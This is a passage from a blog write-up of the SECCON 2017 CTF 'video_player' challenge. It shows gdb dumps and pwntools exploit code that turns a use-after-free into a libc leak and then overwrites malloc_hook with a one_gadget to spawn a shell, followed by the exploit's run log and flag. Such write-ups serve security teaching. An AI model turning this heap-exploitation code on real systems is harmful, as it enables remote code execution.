+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/40gx $cliptable
+0x604400: 0x0000000000604420  0x0000000000000000  &lt;== Pointer to fake video chunk
+0x604410: 0x0000000000000000  0x0000000000000000
+0x604420: 0x0000000000402968  0x0000000000000064  &lt;== Fake video chunk
+0x604430: 0x0000000600000014  0x00000000006040b8  &lt;== Pointer to 
+0x604440: 0x0000000000000000  0x0000000000000000
+0x604450: 0x0000000000000000  0x0000000000000000
+0x604460: 0x0000000000000000  0x0000000000000000</code></pre></figure>
+
+<p>Index 0 of the <code class="language-plaintext highlighter-rouge">clip array</code> now points to our fake video chunk. The <code class="language-plaintext highlighter-rouge">Length</code> for our clip is set to <code class="language-plaintext highlighter-rouge">6</code> and the <code class="language-plaintext highlighter-rouge">Data</code> ptr points to <code class="language-plaintext highlighter-rouge">rand</code> got entry.</p>
+
+<p>With this set up, we can leak the content of <code class="language-plaintext highlighter-rouge">rand got</code> by playing this clip.</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">VideoClip</span><span class="o">::</span><span class="n">Play</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="s">"Playing video..."</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>
+
+  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">Length</span> <span class="o">&gt;=</span> <span class="n">i</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">Data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mh">0xcc</span><span class="p">);</span>
+
+  <span class="n">cout</span><span class="o">&lt;&lt;</span><span class="n">endl</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>The <code class="language-plaintext highlighter-rouge">Play</code> method prints out the content of <code class="language-plaintext highlighter-rouge">Data</code> while <code class="language-plaintext highlighter-rouge">xor</code>ing every byte with <code class="language-plaintext highlighter-rouge">0xcc</code>, so we decode the leaked data by just <code class="language-plaintext highlighter-rouge">xor</code>ing it again.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">play_video_clip</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Enter index : "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">LEAK</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">LEAK</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak value of rand got entry"</span><span class="p">)</span>
+<span class="n">RAND</span> <span class="o">=</span> <span class="n">play_video_clip</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">RAND</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0xcc</span><span class="p">),</span> <span class="n">RAND</span><span class="p">)).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">RAND</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"rand"</span><span class="p">]</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"RAND          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">RAND</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC          : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span></code></pre></figure>
+
+<p>So, we have the libc address and since we can just do an <code class="language-plaintext highlighter-rouge">UAF</code> agin, we still have an arbitrary write. With libc known, <code class="language-plaintext highlighter-rouge">malloc_hook</code> is a good target using <code class="language-plaintext highlighter-rouge">one_gadget</code>to get a shell.</p>
+
+<p>Again, we’ll be placing a misaligned FD pointer in another video clip.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/20gx 0x7ffff7dd3b20-0x30
+0x7ffff7dd3af0: 0x00007ffff7dd2260  0x0000000000000000
+0x7ffff7dd3b00: 0x00007ffff7a94e20  0x00007ffff7a94a00
+0x7ffff7dd3b10: 0x0000000000000000  0x0000000000000000  &lt;== malloc_hook
+0x7ffff7dd3b20: 0x0000000000000000  0x000000000063fd00  &lt;== main_arena
+0x7ffff7dd3b30: 0x000000000063f300  0x000000000063bd90
+0x7ffff7dd3b40: 0x000000000063dee0  0x0000000000639720
+0x7ffff7dd3b50: 0x0000000000000000  0x000000000063fac0
+
+gdb-peda$ x/20gx 0x7ffff7dd3b20-0x28-11
+0x7ffff7dd3aed: 0xfff7dd2260000000  0x000000000000007f  &lt;== fake fastbin chunk size
+0x7ffff7dd3afd: 0xfff7a94e20000000  0xfff7a94a0000007f
+0x7ffff7dd3b0d: 0x000000000000007f  0x0000000000000000
+0x7ffff7dd3b1d: 0x0000000000000000  0x000063fd00000000  &lt;== malloc_hook (somewhere ;))
+0x7ffff7dd3b2d: 0x000063f300000000  0x000063bd90000000
+0x7ffff7dd3b3d: 0x000063dee0000000  0x0000639720000000</code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">MAIN_ARENA</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3c4b20</span>
+<span class="n">MALLOC_TARGET</span> <span class="o">=</span> <span class="n">MAIN_ARENA</span> <span class="o">-</span> <span class="mh">0x28</span> <span class="o">-</span> <span class="mi">11</span>
+<span class="n">ONE_GADGET</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4526a</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"MAIN ARENA    : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">MAIN_ARENA</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"MALLOC_TARGET : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">MALLOC_TARGET</span><span class="p">))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Create malloc overwrite video (data fastbin)"</span><span class="p">)</span>
+<span class="n">add_video_clip</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="s">"C"</span> <span class="o">*</span> <span class="mi">100</span><span class="p">,</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Edit video for UAF (overwrite fastbin FD"</span><span class="p">)</span>
+<span class="n">edit_video_clip</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">MALLOC_TARGET</span><span class="p">),</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Add video to get fake fastbin FD to fastbin list"</span><span class="p">)</span>
+<span class="n">add_video_clip</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="s">"C"</span> <span class="o">*</span> <span class="mi">104</span><span class="p">,</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Add video to overwrite malloc hook"</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">19</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ONE_GADGET</span><span class="p">)</span>
+
+<span class="n">add_video_clip</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="s">"B"</span> <span class="o">*</span> <span class="mi">16</span><span class="p">)</span></code></pre></figure>
+
+<p>All there’s left to do, is creating another video, which will call <code class="language-plaintext highlighter-rouge">malloc</code>. This will trigger <code class="language-plaintext highlighter-rouge">malloc_hook</code>, effectively calling our <code class="language-plaintext highlighter-rouge">one_gadget</code>…</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Add a clip to trigger shell"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1</span><span class="se">\n</span><span class="s">1"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt;&gt; "</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python xpl.py 1
+[*] '/home/ubuntu/video_player'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[+] Opening connection to video_player.pwn.seccon.jp on port 7777: Done
+[*] Create initial video (data =&gt; fastbin size)
+[*] Edit video for UAF (overwrite fastbin FD
+[*] Add video to get fake fastbin FD to fastbin list
+[*] Add video to overwrite fastbin content (bss)
+[*] Leak value of rand got entry
+[*] '/home/ubuntu/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[*] RAND            : 0x7fa2f6db2f60
+[*] LIBC            : 0x7fa2f6d78000
+[*] MAIN ARENA    : 0x7fa2f713cb20
+[*] MALLOC_TARGET : 0x7fa2f713caed
+[*] Create malloc overwrite video (data fastbin)
+[*] Edit video for UAF (overwrite fastbin FD
+[*] Add video to get fake fastbin FD to fastbin list
+[*] Add video to overwrite malloc hook
+[*] Add a clip to trigger shell
+[*] Switching to interactive mode
+$ cat home/chal/flag.txt
+SECCON{Mommy_I_am_scared_to_go_on_stage!!}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=SECCON 2017 Online CTF - video_player&amp;url=https://kileak.github.io/ctf/2017/SECCON2017-video_player/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2017/SECCON2017-video_player/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2017/SECCON2017-video_player';
+        var disqus_title = 'SECCON 2017 Online CTF - video_player';
+        var disqus_url = 'https://kileak.github.io/ctf/2017/SECCON2017-video_player';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
